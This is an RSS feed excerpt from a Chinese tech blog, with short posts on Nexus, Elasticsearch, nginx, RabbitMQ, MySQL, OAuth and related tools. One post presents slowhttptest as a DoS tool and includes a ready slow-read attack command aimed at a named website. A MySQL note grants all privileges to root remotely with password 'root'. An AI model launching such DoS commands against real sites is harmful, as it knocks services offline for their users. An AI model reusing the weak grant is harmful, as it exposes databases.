      <description>基本环境 jdk8 maven3.X curl -L -O https://sonatype-download.global.ssl.fastly.net/repository/repositoryManager/3/nexus-3.12.0-01-unix.tar.gz tar zxvf nexus-3.9.0-01-unix.tar.gz mv nexus-3.9.0-01 /opt/env/nexus #修改端口 vi nexus-default.properties #添加一个用户 useradd -r nexus #切换用户 su nexus cd /opt/env/nexus/bin ./nexus start 启动较慢 su root lsof -i:9000 #java 7401 root 843u IPv4 106307 0t0 TCP pek1-vm-02:cslistener-&amp;gt;10.1.5.154:54703 (ESTABLISHED) #java 7401 root 851u IPv4 91614 0t0 TCP *:cslistener (LISTEN) 如果有以上两个进程成功  </description>
    </item>
    
    <item>
      <title>elasticsearch-bean-setting</title>
      <link>https://www.wuxinvip.com/blog/search-engine/elasticsearch-bean-setting/</link>
      <pubDate>Thu, 24 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/search-engine/elasticsearch-bean-setting/</guid>
      <description>#分片数 index.number_of_shards #副本数 index.number_of_replicas #是否设为影子副本（暂未研究） index.shadow_replicas #是否设为可分享文件系统（暂未研究） index.shard_filesystem #是否自动扩展副本（暂未研究） index.auto_expand_replicas #暂未研究 index.blocks.read_only #暂未研究 index.blocks.read #暂未研究 index.blocks.write #暂未研究 index.blocks.metadata #创建该index用到的Elasticsearch版本 index.version.created index.version.created_string #更新该index用到的Elasticsearch版本 index.verison.upgraded index.version.upgraded_string #该index支持的最小lucene版本 index.version.minimum_compatible #该index建立日期 index.creating_data index.creating_data_string #该index的优先级 index.priority #该index的uuid，唯一标识 index.uuid #该index各索引的routing规则，采用何种Hash方式，默认使用Murmur3，还有一种普通的Hash算法 index.legacy.routing.hash.type #routing计算是否使用type，内部计算shard id的方法已经废弃，建议不使用，不设置，默认false即可 index.legacy.routing.use_type #该index的数据存储路径 index.data_path #暂未研究 #index.shared_filesystem.recover_on_any_node  </description>
    </item>
    
    <item>
      <title>elasticsearch-xmind</title>
      <link>https://www.wuxinvip.com/blog/search-engine/elasticsearch-xmind/</link>
      <pubDate>Thu, 24 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/search-engine/elasticsearch-xmind/</guid>
      <description></description>
    </item>
    
    <item>
      <title>nutch简介</title>
      <link>https://www.wuxinvip.com/blog/search-engine/nutch-1/</link>
      <pubDate>Thu, 24 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/search-engine/nutch-1/</guid>
      <description>简介 发展</description>
    </item>
    
    <item>
      <title>spring-data-es源码</title>
      <link>https://www.wuxinvip.com/blog/spring-cloud/spring-data-es-1/</link>
      <pubDate>Thu, 24 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-cloud/spring-data-es-1/</guid>
      <description>spring-data-common 对接口进行了定义 spring-data-es 对服务进行实现 封装es客户端 学到的更多的是代码的书写吧 各种服务封装 学会了自己封装一个服务给业务部门调用  </description>
    </item>
    
    <item>
      <title>负载均衡</title>
      <link>https://www.wuxinvip.com/blog/load-balance/total/</link>
      <pubDate>Thu, 24 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/load-balance/total/</guid>
      <description>负载均衡起源
将用户请求通过各种算法、均匀的分配到各个服务器上、以保证最大用户量的支撑、 同时服务实例又不会因为请求过载而gg  负载均衡工作模式
说起负载均衡工作模式就得从网络请求说起、因为他工作于用户到服务器的请求路径上 目前基本网络协议 http、【七层】 物理、数据链路、网络、应用层、等等、、、、 基于物理层的 就算是硬件负载均衡设备、在网卡端口上设置算法、均衡服务实例请求量 基于网络层的 一般较软件负载均衡设备 常用的 ：nginx 工作在 4和7层 既有网络层【端口监听】、也有应用层【端口转发】    负载均衡   </description>
    </item>
    
    <item>
      <title>负载均衡算法</title>
      <link>https://www.wuxinvip.com/blog/load-balance/algorithm/</link>
      <pubDate>Wed, 23 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/load-balance/algorithm/</guid>
      <description>常见负载均衡算法 随机
 public static String random() { //重新建立一个map,避免出现由于服务器上线和下线导致的并发问题 Map&amp;lt;String,Integer&amp;gt; serverMap = new HashMap&amp;lt;String,Integer&amp;gt;(); serverMap.putAll(serverWeigthMap); //获取ip列表list Set&amp;lt;String&amp;gt; keySet = serverMap.keySet(); ArrayList&amp;lt;String&amp;gt; keyList = new ArrayList&amp;lt;String&amp;gt;(); keyList.addAll(keySet); java.util.Random random = new java.util.Random(); int randomPos = random.nextInt(keyList.size()); String server = keyList.get(randomPos); return server; }  加权随机
 public static String weightRandom() { //重新建立一个map,避免出现由于服务器上线和下线导致的并发问题 Map&amp;lt;String,Integer&amp;gt; serverMap = new HashMap&amp;lt;String,Integer&amp;gt;(); serverMap.putAll(serverWeigthMap); //获取ip列表list Set&amp;lt;String&amp;gt; keySet = serverMap.keySet(); Iterator&amp;lt;String&amp;gt; it = keySet.iterator(); List&amp;lt;String&amp;gt; serverList = new ArrayList&amp;lt;String&amp;gt;(); while (it.</description>
    </item>
    
    <item>
      <title>nginx</title>
      <link>https://www.wuxinvip.com/blog/load-balance/nginx/</link>
      <pubDate>Sun, 25 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/load-balance/nginx/</guid>
      <description>原理  一个主线程负责请求分发 四个或者两个【可配置】子线程进行请求转发到端口   配置
 支持并发量
  好像是大约支持50000 Pv/s   常用命令  service nginx start service nginx stop service nginx restart nginx -t /etc/nginx/conf.d/www.conf nginx -s reload net start nginx net stop nginx   docker中使用   docker pull nginx docker nginx -t docker nginx -s reload docker service nginx start  转发配置
conf.d/upstream.conf upstream demo{ server 127.0.0.1:8080 weight=1; } default.d/location.conf location /demo/{ http_proxy:http://demo; }  多域名配置</description>
    </item>
    
    <item>
      <title>AMQP</title>
      <link>https://www.wuxinvip.com/blog/agreement/amqp/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/agreement/amqp/</guid>
      <description>AMQP，即Advanced Message Queuing Protocol、高级队列消息协议
一个提供统一消息服务的应用层标准高级消息队列协议,是应用层协议的一个开放标准,为面向消息的中间件设计。 基于此协议的客户端与消息中间件可传递消息，并不受客户端/中间件不同产品，不同的开发语言等条件的限制。 Erlang中的实现有 RabbitMQ等。
协议特性
1、消息方向 2、消息队列 3、消息路由 4、消息可靠性 5、消息安全性  协议元素
1、producer---生产者 2、consumer---消费者 3、virtual host --虚拟主机 4、exchange----交换器 5、queue----消息队列 6、message--消息  定义了 消息发送过程 以及消息系统必须的特性和 具体的消息流转实现 发送方式 可以看看RabbitMQ　消息发送流程 rabbitMQ严格按照AMQP协议定制实现的</description>
    </item>
    
    <item>
      <title>DNS负载均衡</title>
      <link>https://www.wuxinvip.com/blog/load-balance/dns/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/load-balance/dns/</guid>
      <description> 域名解析 dns重定向 存储:本地.阿里云.万网dns服务器
dns 在网络上其实就是域名解析到ip的一个过程叫dns解析
本站域名 www.wuxinvip.com
解析ip 为 39.107.82.228
以此为例、过程
 1、用户请求数据、发送域名到域名解析服务器 2、将域名发送到dns服务解析器【国外顶级域名dns服务器、万网dns服务器、阿里dns服务器】 一般你的域名在哪里买的 会有相应的dns解析服务器【免费提供】 当然这个解析的过程、请求会发到一个主机器、这个机器按照不同规则、将解析 分发个各个dns解析器、然后返回域名对应的外网ip地址 用户拿个这个ip 呼叫公网上叫这个ip的服务器 建立会话  域名攻击  域名直接污染 域名间接污染 域名直接污染: 在用户请求域名的ip地址途中、通过拦截域名解析、把ip指向别的服务器、 比如很普通的、当年百度网站被指向了一个荷兰的一个ip、这就是dns劫持攻击、简单暴力直接瘫痪你的网站 域名间接污染：这个就比较复杂了、dns解析服务器也是一个梯度服务器、上游将域名解析列表发送给下游服务器 如果在上游服务器到下游服务器之间做一个拦截、那么将导致下游的dns解析全部错误、 现在的google不能访问就是这个样子、所以有了各大host访问谷歌的功能、 不过把google真正的ip解析放到自己的电脑里直接访问ip方式、也只能解决很小一部分墙问题、这些ip后续防火墙也会封掉的、 这个就涉及到国家的网络与国际链接的国际出入口的防火墙上（像我天朝“G/.F/.W/.”）、基本上也算是最大的dns污染源  </description>
    </item>
    
    <item>
      <title>DOS攻击工具</title>
      <link>https://www.wuxinvip.com/blog/hack/dos/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/hack/dos/</guid>
      <description>1.slowhttptest 慢速dos攻击 原理 发送一个不完整的数据包.引起服务器保留链接资源.以达成耗费服务器资源目的
bt5 r3安装过程是这样的,你先移动到根目录 运行命令： wget http://slowhttptest.googlecode.com/files/slowhttptest-1.5.tar.gz 第一条：下载 tar -vxf slowhttptest-1.5.tar.gz 解压 cd slowhttptest-1.5/ 进入目录 ./configure 再往下你懂的 make make install 测试白帽攻击是这样的： slowhttptest -c 1000 -X -g -o -slow_read_stats -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://www.loveuv.net -p 3 参数： —a —开始开始值范围说明符用于范围头测试 -b 将字节限制的范围说明符用于范围头测试 - c 的连接数限制为65539 - d proxy host:port 用于指导所有流量通过web代理 - e proxy host:port 端口用于指导只有探针交通通过web代理 - h,B,R或x 指定减缓在头部分或在消息体,- R 允许范围检验,使慢读测试- x - g 生成统计数据在CSV和HTML格式,模式是缓慢的xxx。csv / html,其中xxx是时间和日期 - i seconds 秒间隔跟踪数据在几秒钟内,每个连接 - k 管道因子次数重复请求在同一连接慢读测试如果服务器支持HTTP管道内衬。 - l 在几秒钟内，秒测试时间 - n 秒间隔从接收缓冲区读取操作 - o 文件定义输出文件路径和/或名称,如果指定有效- g - p 秒超时等待HTTP响应在探头连接后,服务器被认为是不可访问的 - r seconds 连接速度 - s 字节值的内容长度标题详细说明,如果指定- b - t verb 自定义 - u URL 目标URL,相同的格式键入浏览器,e。g https://host[:port]/ - v level 冗长等级0 - 4的日志 - w 字节范围广告的窗口大小会选择从 - x 字节最大长度的跟踪数据结束 - y 字节范围广告的窗口大小会选择从 - z 字节从接收缓冲区读取字节与单一的read()操作  也可以查看 man slowhttptest</description>
    </item>
    
    <item>
      <title>ELK 搭建</title>
      <link>https://www.wuxinvip.com/blog/log/elk-1/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/log/elk-1/</guid>
      <description>elasticsearch 安装
官方下载地址：https://www.elastic.co/downloads/elasticsearch linux执行 ：
curl -L -O https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.0.0.tar.gz  下载解压 【建议使用zsh】
修改配置文件 config/elasticsearch.yml
# 集群的名字 cluster.name: cloud # 节点名字 node.name: node-1 # 数据存储目录（多个路径用逗号分隔） path.data: /usr/local/logUtils/elasticsearch/es-data # 日志目录 path.logs: /usr/local/logUtils/elasticsearch/log #本机的ip地址 network.host: 192.168.0.135 #设置集群中master节点的初始列表，可以通过这些节点来自动发现新加入集群的节点 discovery.zen.ping.unicast.hosts: [&amp;quot;192.168.161.128&amp;quot;] # 设置节点间交互的tcp端口（集群）,(默认9300) transport.tcp.port: 9300 # 监听端口（默认） http.port: 9200 # 增加参数，使head插件可以访问es http.cors.enabled: true http.cors.allow-origin: &amp;quot;*&amp;quot;  运行 bin下的 elasticsearch 进行启动 后台启动 bin/elasticsearch -d
启动结果如下 启动会遇到的问题 1、非root权限启动 新建用户 es 然后把 elasticsearch 文件夹权限归给 新用户es
chown -R es:es elasticsearch  2、 软硬进程限制</description>
    </item>
    
    <item>
      <title>ELK 简介</title>
      <link>https://www.wuxinvip.com/blog/log/elk-2/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/log/elk-2/</guid>
      <description>转载链接：http://www.jianshu.com/p/97fcb10c3556  ElasticSearch是一个基于Lucene构建的开源，分布式，RESTful 搜索引擎。
Logstash传输和处理你的日志、事务或其他数据。
Kibana将 Elasticsearch 的数据分析并渲染为可视化的报表。
为什么使用 ELK ？
对于有一定规模的公司来说，通常会很多个应用，并部署在大量的服务器上。运维和开发人员常常需要通过查看日志来定位问题。如果应用是集群化部署，试想如果登录一台台服务器去查看日志，是多么费时费力。
而通过 ELK 这套解决方案，可以同时实现日志收集、日志搜索和日志分析的功能。
ELK 架构
说明
以上是 ELK 技术栈的一个架构图。从图中可以清楚的看到数据流向。
Beats 是单一用途的数据传输平台，它可以将多台机器的数据发送到 Logstash 或 ElasticSearch。但 Beats 并不是不可或缺的一环，所以本文中暂不介绍。
Logstash 是一个动态数据收集管道。支持以 TCP/UDP/HTTP 多种方式收集数据（也可以接受 Beats 传输来的数据），并对数据做进一步丰富或提取字段处理。
ElasticSearch 是一个基于 JSON 的分布式的搜索和分析引擎。作为 ELK 的核心，它集中存储数据。
Kibana 是 ELK 的用户界面。它将收集的数据进行可视化展示（各种报表、图形化数据），并提供配置、管理 ELK 的界面。
支持图形各种数据图形</description>
    </item>
    
    <item>
      <title>EUREKA服务治理</title>
      <link>https://www.wuxinvip.com/blog/spring-cloud/eureka-1/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-cloud/eureka-1/</guid>
      <description>1、服务治理三个核心点、服务提供者、服务消费者、服务注册中心
结合Ribbon 服务治理图 服务治理时序图
服务提供者功能：
1、服务注册 2、服务同步 3、服务续约 4、..
服务注册： 服务提供者在启动时候通过rest请求 、将自己注册到Eureka Server上、同时携带自身服务的一些元数据信息、 Eureka Server接收到这个rest请求后 将这些元数据存储到一个双层结构Map中、其中第一层map 的key是服务名字、第二层key是具体服务实例名、 相关配置： eureka.client.register-with-eureka=true 【默认 true】 服务同步： 情景：两个相同的服务提供者实例、注册到了不同的服务注册中心、那么由于两个服务注册中心互相注册、服务注册中心会将服务注册信息发送给Eureka-server的其他机器、【还有一种说法是eureka-server 有信息服务功能、server与server之间 有消息同步、不确定这两种说法那个是真是的底层机制、后者是官方的说法、前者是 翟永超书里的说法、也就是说服务同步是由Eureka-server来完成的】 服务续约： 服务注册后、会维持一个心跳来维持服务不被剔除 相关配置： eureka: instance: status-page-url-path: /info //服务信息 health-check-url-path: /health //服务健康状态 lease-expiration-duration-in-seconds: 90 //服务失效时间 lease-renewal-interval-in-seconds: 30 //服务续约持续调用时间  服务消费者功能：
1、获取服务 2、服务调用 3、服务下线 4、..
获取服务： 服务消费者会发送一个rest请求获取一个服务列表、Eureka-server会发给client一个只读的服务列表、且该列表会30s刷新一次 相关配置： eureka: client: fetch-registry: true //默认为true 设为false则无法获取服务 registry-fetch-interval-seconds: 30 //服务清单刷新时间 服务调用： 集成Ribbon后、默认会使用轮询机制来调取服务实例信息 对于实例选择、在eureka中会有Region和Zone概念 一个Region会有很多Zone、每个服务都需要被注册到一个Zone中、所以每个client对应一个Region和一个Zone、服务调用时候会优先访问Zone下列表、没有在访问同一个Region不同Zone下的服务、 服务下线： 当服务实例jinx你给正常的关闭时、client会给server发送一个server、告知 &amp;quot;我要下线了&amp;quot;  服务注册中心功能：</description>
    </item>
    
    <item>
      <title>Feign服务调用</title>
      <link>https://www.wuxinvip.com/blog/spring-cloud/feign-1/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-cloud/feign-1/</guid>
      <description>为了服务之间的服务调用 基于Retrofit,
JAXRS-2.0,
andWebSocket.
开发的 客户端调用工具
更简单方便的调用服务信息
以下是官方简单介绍以及基本用法示例
github
interface Bank { @RequestLine(&amp;quot;POST /account/{id}&amp;quot;) Account getAccountInfo(@Param(&amp;quot;id&amp;quot;) String id); } @RequestMapping(value = &amp;quot;/test/&amp;quot;,method = RequestMethod.GET) RestResponse test(@RequestParam(&amp;quot;test&amp;quot;)Long test); /** * 带参调用方法 * @RequestLine(&amp;quot;POST /uc/login0&amp;quot;) * @Headers(&amp;quot;Content-type: application/json&amp;quot;) * String example0(@RequestParam(&amp;quot;id&amp;quot;) String id); * @RequestLine(&amp;quot;PUT /uc/login1&amp;quot;) * @Headers(&amp;quot;Content-type: application/json&amp;quot;) * String example1(@RequestBody UserVO userVO); * */  </description>
    </item>
    
    <item>
      <title>Filter安全过滤高级最终行（XSS攻击）</title>
      <link>https://www.wuxinvip.com/blog/hack/filter-xss/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/hack/filter-xss/</guid>
      <description>package com.what21.filter.xss;
import java.io.IOException; import java.util.LinkedHashMap; import java.util.Map;
import javax.servlet.Filter; import javax.servlet.FilterChain; import javax.servlet.FilterConfig; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.http.HttpServletRequest;
public class XSSFilter implements Filter {
// XSS处理Map private static Map&amp;lt;String,String&amp;gt; xssMap = new LinkedHashMap&amp;lt;String,String&amp;gt;(); public void init(FilterConfig filterConfig) throws ServletException { // 含有脚本： script xssMap.put(&amp;quot;[s|S][c|C][r|R][i|C][p|P][t|T]&amp;quot;, &amp;quot;&amp;quot;); // 含有脚本 javascript xssMap.put(&amp;quot;[\\\&amp;quot;\\\&#39;][\\s]*[j|J][a|A][v|V][a|A][s|S][c|C][r|R][i|I][p|P][t|T]:(.*)[\\\&amp;quot;\\\&#39;]&amp;quot;, &amp;quot;\&amp;quot;\&amp;quot;&amp;quot;); // 含有函数： eval xssMap.put(&amp;quot;[e|E][v|V][a|A][l|L]\\((.*)\\)&amp;quot;, &amp;quot;&amp;quot;); // 含有符号 &amp;lt; xssMap.put(&amp;quot;&amp;lt;&amp;quot;, &amp;quot;&amp;amp;lt;&amp;quot;); // 含有符号 &amp;gt; xssMap.put(&amp;quot;&amp;gt;&amp;quot;, &amp;quot;&amp;amp;gt;&amp;quot;); // 含有符号 ( xssMap.</description>
    </item>
    
    <item>
      <title>Https协议</title>
      <link>https://www.wuxinvip.com/blog/agreement/https/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/agreement/https/</guid>
      <description>http+ssl
使用http进行通信 ssl作为数据通信加密方式 使用非对称方式协商加密密钥、然后使用协商后的密钥进行密钥通信  混合加密方式
非对称加密方式协商加密方式、最后使用加密方式通讯
 1、客户端 发送公钥、支持加密方式、版本号 2、服务器接收 公钥加密校验、选择加密方式 放松给客户端 3、客户端接收 服务器选定加密方式进行数据加密 4、使用协商后的加密方式加密http请求  </description>
    </item>
    
    <item>
      <title>Hystrix</title>
      <link>https://www.wuxinvip.com/blog/spring-cloud/hystrix/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-cloud/hystrix/</guid>
      <description>原理
1、流程图 1、方法标注 @HystrixCommand注解 2、方法执行进入执行队列、方法执行、【图中标注 .toObservable()状态】 3、缓存是否可见【有 返回缓存数据；没有进入下一步判断】 4、断路器是否打开【未打开 直接判断信号量线程池是否拒绝 ；打开且触发断路进去fallback方法】 5、信号量线程池是否拒绝【未拒绝 创建线程池隔离舱执行业务逻辑 ；拒绝 执行fallback方法】 6、业务逻辑执行是否成功【成功 判断是否超时；未成功 执行fallback方法】 7、判断是否超时【超时 不返回 未超时返回数据】 8、fallback执行结果【成功 返回数据 ；失败 返回失败或者自行实现业务方法】 其中方法执行结果要返回断路器健康状态给断路器【也就是图中绿色4】  具体信息可见官方详细：
https://github.com/Netflix/Hystrix/wiki/How-it-Works</description>
    </item>
    
    <item>
      <title>Kafka-1.0.0版本</title>
      <link>https://www.wuxinvip.com/blog/message-queue/kafka-1/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/message-queue/kafka-1/</guid>
      <description>Kafka 1.0.0发布的主要内容如下。
0.10.0版本里开始引入的Streams API在1.0.0版本里继续演进，改进了builder API（KIP-120）， 新增了用于查看运行时活跃任务的API（KIP-130）和用于聚合分区的cogroup API（KIP-150）。增强的print()和writeAsText()方法让调试变得更容易（KIP-160）。 其他更多信息可以参考Streams文档。
改进了Connect的度量指标（KIP-196），新增了大量用于健康监测的度量指标（KIP-188）， 并提供了集群的GloabalTopicCount和GlobalPartitionCount度量指标（KIP-168）。 支持Java 9，实现更快的TLS和CRC32C，加快了加密速度，降低了计算开销。 调整了SASL认证模块的错误处理逻辑（KIP-152），原先的认证错误信息现在被清晰地记录到日志当中。 更好地支持磁盘容错（KIP-112），更优雅地处理磁盘错误，单个JBOD上的磁盘错误不会导致整个集群崩溃。 0.11.0版本中引入的幂等性生产者需要将max.in.flight.requests.per.connection参数设置为1，这对吞吐量造成了一定的限制。 而在1.0.0版本里，这个参数最大可以被设置为5（KAFKA-5949），极大提升了吞吐量范围。
关于新版本更多的变化可以查看发布说明，也可以下载源代码和二进制包（Scala 2.11、Scala 2.12）。</description>
    </item>
    
    <item>
      <title>MYSQL版本选择</title>
      <link>https://www.wuxinvip.com/blog/mysql/mysql-version-selected/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/mysql-version-selected/</guid>
      <description>学习阿里mysql笔记
mysql 历史过程中产生了三个版本
Percona Server : 有领先的MYSQL咨询公司 Percona公司发布
Maria DB : MYSQL最早创始人 重新做的一个版本
MYSQL : Oracle公司收购的版本
关于mysql存储引擎：MyISAM、InnoDB、XtraDB
最早、最原始的存储引擎MyISAM、缺点不支持事务、优点 读写性能要好 InnoDB 支持了事务、并把数据操作记录到日志、安全性较好、读写性能也有很大提高、稍低MyISAM(mysql 5.5之后默认存储引擎选取了InnoDB) XtraDB 是InnoDB增强版本、被设计用来更新计算机硬件系统性能、同时还包含了一些高性能环境下新特性。  Percona Server发展到10.X版本、最接近mysql企业版本 最主要特性、提供了存储引擎 XtraDB、还提供PXC高可用解决方案、还有percona-tookit等DBA管理工具箱、 【据使用经验 这个版本性能非常非常高的 推荐排名第一位】 MariaDB 目标、取代现在mysql、oracle的mysql闭源危机 使用完全兼容mysql。 优点支持脚本初始化、与最初mysql代码改动最大、成熟度较低 支持新工具、新功能在不断完善、、 【第二推荐】 MYSQL ：官方版本、使用量最多、后续趋势会被其他两种取代、 性能方面、在企业版本会增加一些新功能、但是收费 【第三推荐、对性能要求不高、稳定版本】  InnoDB :支持事务 、行级锁、外键</description>
    </item>
    
    <item>
      <title>MySQL常用命令</title>
      <link>https://www.wuxinvip.com/blog/mysql/mysql-shell/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/mysql-shell/</guid>
      <description>mysql -u root -p use user; drop database user; use mysql select Host,User,authentication_string from mysql.user; grant all privileges on *.* to &#39;root&#39;@&#39;115.171.60.75&#39;identified by &#39;root&#39; with grant option; all insert update ... *.* : 数据库.表名 root : 用户名 115.170.*.* : 远程访问ip地址 刷新配置 flush privileges; delete from mysql.user where user=root and host = 115.171.60.75;  安装 原装地址：http://www.cnblogs.com/5201351/p/4912614.html
卸载mriadb包 [root@5201351 ~]# rpm -qa|grep mariadb mariadb-libs-5.5.41-2.el7_0.x86_64 [root@5201351 ~]# rpm -e mariadb-libs-5.5.41-2.el7_0.x86_64 --nodeps 安装 mysql 安装包 https://dev.</description>
    </item>
    
    <item>
      <title>OAuth OAuth2</title>
      <link>https://www.wuxinvip.com/blog/service-permission/oauth-oauth2/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/service-permission/oauth-oauth2/</guid>
      <description>翻了几篇子 认证 csdn 一个模样 连错误都一样
《用访问令牌到授权服务器换取访问令牌(accesstoken&amp;amp;secret)》 这叫人怎么理解 ？？
果断找官网 https://oauth.net/core/1.0a/
https://oauth.net/2/
OAuth2 授权类型 1、运行在网络服务器，基于浏览器和移动应用程序的应用程序的授权码【web授权】 2、密码为与登录用户名和密码 3、客户端凭证的应用程序访问 4、Implicit以前曾被推荐给没有秘密的客户，但已被使用授权代码授权而没有秘密取代。 OAuth认证和授权的过程如下: 1、用户访问第三方网站网站，想对用户存放在服务商的某些资源进行操作。 2、第三方网站向服务商请求一个临时令牌。 3、服务商验证第三方网站的身份后，授予一个临时令牌。 4、第三方网站获得临时令牌后，将用户导向至服务商的授权页面请求用户授权，然后这个过程中将临时令牌和第三方网站的返回地址发送给服务商。 5、用户在服务商的授权页面上输入自己的用户名和密码，授权第三方网站访问所相应的资源。 6、授权成功后，服务商将用户导向第三方网站的返回地址。 7、第三方网站根据临时令牌从服务商那里获取访问令牌。 8、服务商根据令牌和用户的授权情况授予第三方网站访问令牌。 9、第三方网站使用获取到的访问令牌访问存放在服务商的对应的用户资源。  国外文档：https://aaronparecki.com/oauth-2-simplified/
看不懂的用有道翻译啊[捂脸笑][捂脸笑][捂脸笑]
巨详细的请求解释 看看国内的 mmp</description>
    </item>
    
    <item>
      <title>RPC</title>
      <link>https://www.wuxinvip.com/blog/agreement/rpc/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/agreement/rpc/</guid>
      <description>RPC（Remote Procedure Call）—远程过程调用
工作原理
 1.调用客户端句柄；执行传送参数 2.调用本地系统内核发送网络消息 3.消息传送到远程主机 4.服务器句柄得到消息并取得参数 5.执行远程过程
 6.执行的过程将结果返回服务器句柄
 7.服务器句柄返回结果，调用远程系统内核
 8.消息传回本地主机
 9.客户句柄由内核接收消息
 10.客户接收句柄返回的数据
  协议结构
 远程过程调用（RPC）信息协议由两个不同结构组成：调用信息和答复信息。信息流程如下所示： RPC：远程过程调用流程 RPC 调用信息：每条远程过程调用信息包括以下无符号整数字段，以独立识别远程过程： 程序号（Program number） 程序版本号（Program version number） 过程号（Procedure number） RPC 调用信息主体形式如下： struct call_body { unsigned int rpcvers; unsigned int prog; unsigned int vers; unsigned int proc; opaque_auth cred; opaque_auth verf; 1 parameter 2 parameter . . . }； RPC 答复信息：RPC 协议的答复信息的改变取决于网络服务器对调用信息是接收还是拒绝。答复信息请求包括区别以下情形的各种信息： RPC 成功执行调用信息。. RPC 的远程实现不是协议第二版，返回 RPC 支持的最低和最高版本号。 在远程系统中，远程程序不可用。 远程程序不支持被请求的版本号。返回远程程序所支持的最低和最高版本号。 请求的过程号不存在。通常是呼叫方协议或程序差错。 RPC答复信息形式如下： enum reply_stat stat {MSG_ACCEPTED = 0, MSG_DENIED = 1 };  </description>
    </item>
    
    <item>
      <title>RabbitMQ Exception</title>
      <link>https://www.wuxinvip.com/blog/message-queue/rabbitmq-exception/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/message-queue/rabbitmq-exception/</guid>
      <description>需求@RabbitListener - defining queues from properties
issues
1.5.RA版本修复
修复方式 spel表达式
 @RabbitListener(queues = {&amp;quot;#{&#39;${listener.channel}&#39;.split(&#39;,&#39;)}&amp;quot;})  </description>
    </item>
    
    <item>
      <title>RabbitMQ test</title>
      <link>https://www.wuxinvip.com/blog/message-queue/rabbitmq-test/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/message-queue/rabbitmq-test/</guid>
      <description>累积 36万条消息堆积
启动消费端【单机】
开始消费time 00:52:28 结束时间00:54:40
测试环境 三台rabbit集群 两台持久化【n/2+1】 一台非持久化
queue两个 消费由业务房监听spring streamListener完成
总计366178消息 总计消费时间132s 平均每秒2774条
单机实例消费水平收到限制
如果启动多实例消费 那么距离理论4000+4000+12000 = 20000条 有待考证 不过压力不大</description>
    </item>
    
    <item>
      <title>Rabbitmq 安装</title>
      <link>https://www.wuxinvip.com/blog/message-queue/rabbitmq-install/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/message-queue/rabbitmq-install/</guid>
      <description> eralng官方地址 : https://github.com/rabbitmq/erlang-rpm/releases socat官方地址 : https://centos.pkgs.org/7/lux/socat-1.7.3.2-5.el7.lux.x86_64.rpm.html rabbitmq 官方地址: http://www.rabbitmq.com/install-rpm.html 下载命令 erlang : curl -L -O https://github.com/rabbitmq/erlang-rpm/releases/download/v20.1.7/erlang-20.1.7-1.el7.centos.x86_64.rpm rpm -ivh erlang-20.1.7-1.el7.centos.x86_64.rpm 安装: socat yum install socat rabbitmq : curl -L -O https://dl.bintray.com/rabbitmq/all/rabbitmq-server/3.7.0/rabbitmq-server-3.7.0-1.el7.noarch.rpm rpm -ivh rabbitmq-server-3.7.0-1.el7.noarch.rpm 查看 rabbit状态 service rabbitmq-server status 启动rabbit service rabbitmq-server start 安装 web插件 rabbitmq-plugins enable rabbitmq_management 添加用户 rabbitmqctl add_user admin admin 给予管理权限 rabbitmqctl set_user_tags admin administrator  </description>
    </item>
    
    <item>
      <title>Reactor Core</title>
      <link>https://www.wuxinvip.com/blog/spring-cloud/reactor-core/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-cloud/reactor-core/</guid>
      <description>本文从以下介绍下 Reactor （反应堆）
